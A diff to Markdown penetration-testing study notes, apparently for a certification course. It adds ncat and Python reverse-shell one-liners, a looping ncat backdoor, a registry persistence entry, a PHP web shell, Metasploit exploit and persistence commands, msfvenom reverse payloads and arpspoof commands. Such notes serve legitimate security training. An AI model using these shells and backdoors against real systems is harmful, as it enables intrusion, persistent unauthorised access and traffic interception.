@@ -1,5 +1,72 @@
 # Penetration Testing Basics
 
+- [Information Gathering](#information-gathering)
+  - [Open-Source Intelligence](#open-source-intelligence)
+  - [Subdomain Enumeration](#subdomain-enumeration)
+- [Footprinting & Scanning](#footprinting--scanning)
+  - [Mapping a Network](#mapping-a-network)
+  - [Nmap Ping Scan](#nmap-ping-scan)
+  - [OS Fingerprinting](#os-fingerprinting)
+  - [Port Scanning](#port-scanning)
+    - [TCP Connect Scan](#tcp-connect-scan)
+    - [TCP SYN Scan](#tcp-syn-scan)
+    - [Nmap Scan Types](#nmap-scan-types)
+    - [NMAP Port Scanning](#nmap-port-scanning)
+    - [Specifying targets](#specifying-targets)
+    - [Discovering Network with Port Scanning](#discovering-network-with-port-scanning)
+    - [Spotting a Firewall](#spotting-a-firewall)
+  - [`masscan`](#masscan)
+  - [Examples: Scanning and OS Fingerprinting](#examples-scanning-and-os-fingerprinting)
+- [Vulnerability Assessment](#vulnerability-assessment)
+  - [Vulnerability Assessment](#vulnerability-assessment-1)
+  - [Nessus](#nessus)
+- [Web Attacks](#web-attacks)
+  - [Fingerprinting with `nc`, `openssl` & `httprint`](#fingerprinting-with-nc-openssl--httprint)
+  - [HTTP Verbs](#http-verbs)
+  - [Exploiting Misconfigured HTTP verbs](#exploiting-misconfigured-http-verbs)
+  - [`nc`](#nc)
+  - [Directories and Files Enumeration](#directories-and-files-enumeration)
+  - [Dirb](#dirb)
+  - [Dirbuster](#dirbuster)
+  - [Google Hacking](#google-hacking)
+  - [Cross Site Scripting](#cross-site-scripting)
+  - [XSS Types](#xss-types)
+  - [SQL Injections](#sql-injections)
+  - [SQL basics](#sql-basics)
+  - [=> Vulnerable Dynamic Queries](#-vulnerable-dynamic-queries)
+  - [=> Boolean Based SQLi](#-boolean-based-sqli)
+  - [=> UNION Based SQL Injections](#-union-based-sql-injections)
+  - [SQLMap](#sqlmap)
+    - [From discord (to test)](#from-discord-to-test)
+- [System Attacks](#system-attacks)
+  - [Backdoor](#backdoor)
+    - [Create stable connection to a remote host](#create-stable-connection-to-a-remote-host)
+  - [Password Attacks](#password-attacks)
+    - [Brute force attacks](#brute-force-attacks)
+    - [Dictionary attacks](#dictionary-attacks)
+    - [Rainbow Tables**](#rainbow-tables)
+  - [John the Ripper](#john-the-ripper)
+  - [Hashcat](#hashcat)
+  - [Buffer Overflow Attacks](#buffer-overflow-attacks)
+    - [Stack](#stack)
+- [Network Attacks](#network-attacks)
+  - [Authentication Cracking](#authentication-cracking)
+  - [Brute Force vs Dictionary Attacks](#brute-force-vs-dictionary-attacks)
+  - [Windows Shares](#windows-shares)
+    - [Shares](#shares)
+  - [Null Sessions](#null-sessions)
+    - [Tools](#tools)
+  - [ARP Poisoning](#arp-poisoning)
+    - [Dsniff Arpspoof](#dsniff-arpspoof)
+  - [Metasploit](#metasploit)
+  - [Meterpreter](#meterpreter)
+  - [Shells](#shells)
+    - [msfvenom](#msfvenom)
+- [Next Steps](#next-steps)
+  - [What to do Next - Study Guide](#what-to-do-next---study-guide)
+  - [Penetration Testing Approach - Study Guide](#penetration-testing-approach---study-guide)
+  - [Career Paths - Study Guide](#career-paths---study-guide)
+
 ## Information Gathering
 
 - Good vs Bad penetration tester.
@@ -82,7 +149,7 @@ These techniques work both on local and remote. Every host connected to the Inte
 
 Example:
 
-```
+```bash
 Block: 200.200.0.0/16
 2^16 hosts = 200.200.0.0 - 200.200.255.255
 ```
@@ -769,6 +836,9 @@ ncat localhost 5555
 ncat -l -p 5555 -v
 # => Victim / Client
 ncat -e /bin/bash remoteIP remotePort
+
+# bash interactive for friendly prompt
+bash -i
 ```
 
 ```bash
@@ -779,6 +849,19 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CurrentVersion\Run
 # Add string value
 Name: ncact
 Value: yourpath\ncat attackerMachine Port -e cmd.exe
+```
+
+```bash
+# Persistent connection script
+# By default netcat does not have a persistent connection.
+# You will need to run it in a while loop if you want to connect to it more than once.
+# Otherwise it will close the program after the first connection:
+# https://defcon.org/images/defcon-22/dc-22-presentations/Nemus/DEFCON-22-Lance-Buttars-Nemus-Intro-to-backdooring-OS.pdf
+
+#!/bin/bash
+while [ 1 ]; do
+  echo | ncat -l -v -p 445 -e /bin/bash
+done
 ```
 
 ### Password Attacks
@@ -1052,7 +1135,7 @@ Use with `-n` to tell the tool to use null sessions
 winfo <target_IP> -n
 ```
 
-##### Exploiting Null Sessoins with Enum4linux
+##### Exploiting Null sessions with Enum4linux
 
 A PERL script that can perform the same operations of `enum` and `winfo`, supplying some other features:
 - User enumeration
@@ -1063,54 +1146,70 @@ A PERL script that can perform the same operations of `enum` and `winfo`, supply
 - A nmblookup run
 - Printer information extraction
 
-#### <span style="color:red">VIDEO - (6/17) Null Session</span>
 
+```bash
+# Look for null sessions in the network
+nmap -sS -p135,139,445 <IP>
 
+# => enum4linux
+# -n
+# -P Password policies of the system
+# -S shares available in the remote machine
+# brute force:
+enum3linux -s /usr/share/enum4linux/share-list.txt <IP>
+# -a do all simple enumeration
 
+# => samrdump
+# It's under : /usr/share/doc/python-impacket-doc/examples
+python samrdump <IP>
 
+# => nmap
+nmap -script=smb-enum-shares <IP>
+nmap -script=smb-brute <IP>
+```
 
+Use samba in Kali:
+```bash
+> vi /etc/samba/smb.conf
 
+# Under [global]
+client min protocol = CORE
+client max protocol = SMB3
+client use spnego = no
+client ntlmv2 auth = no
 
+# Get file shares using smbclient
+smbclient -L WORKGROUP -I <IP> -N -U ""
 
+# Access to a folder
+smbclient \\\\<IP>\\WorkSharing -N
+smb: \> ls
+smb: \> get flag.txt /home/kali/Desktop/flag.txt
+```
 
+### ARP Poisoning
 
-
-
-
-
-
-
-
-
-
-
-#### <span style="color:red">LAB - (7/17) Null Session</span>
-
-#### (8/17) ARP Poisoning - Study Guide
-
-ARM poisoning is a powerful attack you can use to intercept traffic on a switched network.
-- If an attacker finds a way to manipulate the ARP cache, then the attacker will also be able to receive traffic destined to other IP addresses.
+If an attacker finds a way to manipulate the ARP cache, then the attacker will also be able to receive traffic destined to other IP addresses.
 
 > Ability to:
-> - Perform MITM attacks
-> - Mount advanced attacks
-> - Sniff traffic on a switched network
+> - Perform MITM attacks.
+> - Mount advanced attacks.
+> - Sniff traffic on a switched network.
 
 - The attacker can manipulate other hosts' ARP cache tables by sending gratuitous ARP replies.
-- Gratuitous ARP replies = ARP reply messages
-- The attacker exploits gratuitous ARP messages to tell the victims that they can reach a specific IP address at the attacker's machine MAC address
-- The opration is performed on every victim
-- As soon as the ARP cache table contains fake info, every packet of every communication between the poisoned nodes will be sent to the attacker's machine
-- The attacker can prevent the poisoned entry from expiring by sending gratuitous ARP replies every 30 seconds or so
-- This operation lets the hacker sniff traffic between the poisoned hosts even if the machines sit on a switched network
-- An attacker could also change the content of the packets
-- This kind of attack can be used on an entire network and against a router, letting the attacker intercept the communication between a LAN and the internet
+- Gratuitous ARP replies = ARP reply messages.
+- The attacker exploits gratuitous ARP messages to tell the victims that they can reach a specific IP address at the attacker's machine MAC address.
+- The operation is performed on every victim.
+- As soon as the ARP cache table contains fake info, every packet of every communication between the poisoned nodes will be sent to the attacker's machine.
+- The attacker can prevent the poisoned entry from expiring by sending gratuitous ARP replies every 30 seconds or so.
+- This kind of attack can be used on an entire network and against a router, letting the attacker intercept the communication between a LAN and the internet.
 
-##### Dsniff Arpspoof
+#### Dsniff Arpspoof
 
-Collection of tools for network auditing and penetration testing, including `arpspoof`, designed to intercept traffic on a switched LAN. `arpspoof` redirects packets from a target host (or all hosts) on the LAN intended for another host on the LAN by forging ARP replies.
+Collection of tools for network auditing and penetration testing, including `arpspoof`, designed to intercept traffic on a switched LAN.
+`arpspoof` redirects packets from a target host (or all hosts) on the LAN intended for another host on the LAN by forging ARP replies.
 
-before running the tool, you have to enable the _Linux Kernel IP Forwarding_, a feature that transforms a Linux box into a router. By enabling IP forwarding, you tell your machine to forward the packets you interecept to the real destination host:
+Before running the tool, you have to enable the _Linux Kernel IP Forwarding_, a feature that transforms a Linux box into a router. By enabling IP forwarding, you tell your machine to forward the packets you interecept to the real destination host:
 
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -1118,31 +1217,35 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 # right after you can run arpspoof
 arpspoof -i <interface> -t <target> -r <host>
 # target and hosts are the victims IP addresses
+
+# => Example
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i tap0 -t 10.100.13.37 -r 10.100.13.36
 ```
 
-####  <span style="color:red">VIDEO - (9/17) ARP Spoofing</span>
-#### <span style="color:red">LAB - (10/17) ARP Poisoning</span>
-
-#### (11/17) Metasploit - Study Guide
+### Metasploit
 
 Metasploit is an open-source framework used for penetration testing and exploit development, giving a wide array of community contributed exploits and attack vectors that can be used against various systems. Extensible.
 
 Basic workflow:
-- Identifying a vulnerable service
-- Searching for a proper exploit for that service
-- Loading and configuring the exploit
-- Loading and configuring the payload you want to use
-- Running the exploit code and getting access to the vulnerable machine
+- Identifying a vulnerable service.
+- Searching for a proper exploit for that service.
+- Loading and configuring the exploit.
+- Loading and configuring the payload you want to use.
+- Running the exploit code and getting access to the vulnerable machine.
 
 A payload is used by an attacker to get:
-- An OS Shell
-- A VNC or RDP connection
-- A Meterpreter shell
-- The execution of an attacker-supplied application
+- An OS Shell.
+- A VNC or RDP connection.
+- A Meterpreter shell.
+- The execution of an attacker-supplied application.
 
-A special payload, with many useful features under the pentesting point  of view is `meterpreter`.
+A special payload, with many useful features under the penetration testing point  of view is `meterpreter`.
+
 ```bash
+service postgresql start
 msfconsole
+> help
 > show -h
 > search <searchterm> # search for a specific module by using the search cmd
 > search skeleton
@@ -1157,10 +1260,39 @@ msfconsole
 > exploit
 ```
 
-#### <span style="color:red">VIDEO -(12/17) Metasploit</span>
-#### <span style="color:red">LAB -(13/17) Metasploit</span>
+```bash
+# Exploit freeftpd
+> use exploit/windows/ftp/freeftpd_pass
+> set ftpuser anonymous
+> set rhosts 192.168.99.12
+> set rport 21
+> set payload windows/meterpreter/reverse_tcp
+> set exitfunc process
+> set lhost 192.168.99.100
+> set lport 4444
+> exploit
+# Get user
+> getuid
+# Obtain System privileges on the machine
+> getsystem
+```
 
-#### (14/17) Meterpreter - Study Guide
+```bash
+# Set backdoor
+use exploit/windows/local/persistence
+set reg_name backdoor
+set exe_name backdoor
+set startup SYSTEM
+set session 1
+set payload windows/meterpreter/reverse_tcp
+set exitfunc process
+set lhost 192.168.99.100
+set lport 5555
+set DisablePayloadHandler false
+exploit //if the backdoor doesn't start immediately, use "exploit -j" instead
+```
+
+### Meterpreter
 
 > Ability to:
 > - Get a powerful shell on an exploited machine
@@ -1168,14 +1300,14 @@ msfconsole
 > - Install backdoors
 
 Provides advanced features to:
-- gather information
-- transfer files between the attacker and victim machines
-- install backdoors and more
-- meterpreter can both wait for a connection on the target machine or connect back to the attacker machine
-- a Meterpreter session is an advnaced shell on the target machine
-- most used configurations are
-  - *bind_tcp*: runs a server process on the target machine that waits for connections from the attacker machine
-  - *reverse_tcp*: performs a TCP connection back to the attacker machine (helping to evade firewall rules)
+- Gather information.
+- Transfer files between the attacker and victim machines.
+- Install backdoors and more.
+- `meterpreter` can both wait for a connection on the target machine or connect back to the attacker machine.
+- A Meterpreter session is an advanced shell on the target machine.
+- Most used configurations are:
+  - *bind_tcp*: runs a server process on the target machine that waits for connections from the attacker machine.
+  - *reverse_tcp*: performs a TCP connection back to the attacker machine (helping to evade firewall rules).
 
 Inside a `msfconsole`:
 
@@ -1211,13 +1343,79 @@ Inside a `msfconsole`:
 > shell
 ```
 
-#### <span style="color:red">VIDEO - (15/17) Meterpreter</span>
-#### <span style="color:red">VIDEO - (16/17) Beyond Remote Code Execution</span>
-#### <span style="color:red">VIDEO - (17/17) Shells</span>
+```bash
+# Is UAC enabled?
+run post/windows/gather/win_privs
+```
 
-### Next Steps (6 items)
+### Shells
 
-#### (1/6) What to do Next - Study Guide
+```bash
+system('ls');
+
+echo 'ls';
+
+passthru("ls");
+
+# Python
+import os
+exit_code = os.system('ls')
+output    = os.popen('ls').read()
+```
+
+Simple php shell:
+```php
+<html>
+<?php
+  echo "<form method=GET><input type=text name=cmd><input type=submit value=ok></form>";
+  system($_GET["cmd"]);
+```
+
+Reverse Shell is the most common one we'll use:
+
+```python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+#### msfvenom
+
+```bash
+# msfvenom
+# => list payloads for linux
+msfvenom --list payloads | grep x64 | grep linux | grep reverse
+
+# => Generate Staged payload
+msfvenom -p linux/x64/shell/reverse_tcp lhost=<attacker_IP> lport=443 -f elf -o r443
+chmod +x r433
+
+# => Generate Stagelesss payload
+> msfvenom --list payloads | grep php | grep reverse
+> msfvenom -p php/reverse_php lhost=<attacker_IP> lport=443 -o r443.php
+
+# => Listener staged
+$ msfconsole
+> use exploit/multi/handler
+> set payload linux/x64/shell/reverse_tcp # has to be exactly the same!
+> set lhost 0.0.0.0
+> set lport 443
+> run # wait for session
+
+# => Listener Stageless
+> nc -lvp 4343
+# or listen to in MSF with exact payload and the exploit/multi/handler
+
+
+# Difference between:
+#  linux/x64/shell/reverse_tcp
+#  linux/x64/shell_reverse_tcp
+#
+# Staged: it's smaller. Not enough to create a shell itself. You require to use a msf listener.
+# Stageless: it's bigger. It doesn't need anything aditional, just nc in your computer as a listener.
+#
+```
+## Next Steps
+
+### What to do Next - Study Guide
 
 - Each BlackBox Penetration Testing labs contains 2-4 machines that should be exploited
 - There are flags per machine
@@ -1225,10 +1423,7 @@ Inside a `msfconsole`:
 
 > Study and get updated, new exploitation techniques are being discovered daily, start a blog, read feeds.
 
-#### (2/6) Black-box Penetration Test 1
-#### (3/6) Black-box Penetration Test 2
-#### (4/6) Black-box Penetration Test 3
-#### (5/6) Penetration Testing Approach - Study Guide
+### Penetration Testing Approach - Study Guide
 
 - Be curious
 - Don't be ashamed of not knowing
@@ -1237,7 +1432,7 @@ Inside a `msfconsole`:
 - You can't remember everything
 - Follow some existing penetration testing methodology (as OWASP)
   - So you can show your client what tests will be conducted
-#### (6/6) Career Paths - Study Guide
+### Career Paths - Study Guide
 
 - Web App / Network penetration tester
 - Red teamer / Social engineer
@@ -1252,9 +1447,4 @@ Defense:
 - Malware analyst
 - Threat hunter
 - Secure software developer
-- Netowrk and systems defender
-
-## References
-
-- https://kentosec.com/2019/08/04/how-to-pass-the-ejpt/
-- XSS Attacks: [hack.me](hack.me)
+- Network and systems defender
